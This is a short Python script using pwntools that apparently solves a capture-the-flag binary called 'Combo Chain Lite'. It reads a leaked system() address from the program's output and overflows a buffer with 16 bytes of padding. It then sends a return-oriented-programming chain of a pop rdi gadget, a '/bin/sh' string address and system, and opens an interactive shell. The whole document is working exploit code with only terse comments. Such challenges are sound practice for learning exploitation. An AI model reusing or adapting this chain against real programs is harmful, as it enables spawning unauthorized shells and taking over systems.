#Combo Chain Lite

from pwn import *

p = process("./combo-chain-lite")

x = p.recv()


system = x[27:41]

system_hex = int(system, 16)

rop_chain = p64(0x0000000000401273) #adds address of pop rdi; ret;
rop_chain += p64(0x402051) # adds "bin/sh found in radare with / /bin/sh, nvm i used gef 
rop_chain += p64(system_hex) # adds system call

p.sendline("A"*16 + rop_chain)

p.interactive()




